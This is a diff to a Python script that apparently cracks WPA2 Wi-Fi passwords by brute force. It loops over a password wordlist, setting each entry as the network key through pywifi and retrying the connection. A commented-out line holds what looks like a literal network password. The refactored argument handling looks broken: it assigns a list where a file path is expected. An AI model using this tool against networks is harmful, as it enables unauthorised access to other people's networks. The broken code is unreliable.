@@ -5,8 +5,19 @@ import sys
 import os
 import getopt
 
+file = ''
+try:
+    opts, args = getopt.getopt(sys.argv, "r", ["file="])
+except getopt.GetoptError:
+    print("usage: -r password_file")
+    sys.exit(2)
+file = args
+if not os.path.exists(file):
+    print("file does not exists.")
+    sys.exit()
 
-def passwords_list(file)
+
+def passwords_list():
     passwords = []
     with open(file, 'r', encoding='utf8') as words:
         for password in words:
@@ -15,22 +26,12 @@ def passwords_list(file)
     return passwords
 
 
-def main(argv):
-    file = ''
-    try:
-        opts, args = getopt.getopt(argv, "r", ["file="])
-    except getopt.GetoptError:
-        print("usage: -r password_file")
-        sys.exit(2)
+def bruteforce():
     if os.getuid() != 0:
         print("You need to have root privileges to use this program. Please "
               "try again using 'sudo'.\n")
         sys.exit()
-    file = args
-    if not os.path.exists(file):
-        print("file does not exists.")
-        sys.exit()
-    passwords = passwords_list(file)
+    passwords = passwords_list()
 #    wifi = pywifi.PyWiFi()
 #    interfaces = wifi.interfaces()[0]
 
@@ -45,7 +46,7 @@ def main(argv):
     profile.akm.append(const.AKM_TYPE_WPA2PSK)
     profile.cipher = const.CIPHER_TYPE_CCMP
     for password in passwords:
-        #profile.key = "rba5829qaBdk"
+        # profile.key = "rba5829qaBdk"
         profile.key = password
         interface.remove_all_network_profiles()
         new_profile = interface.add_network_profile(profile)
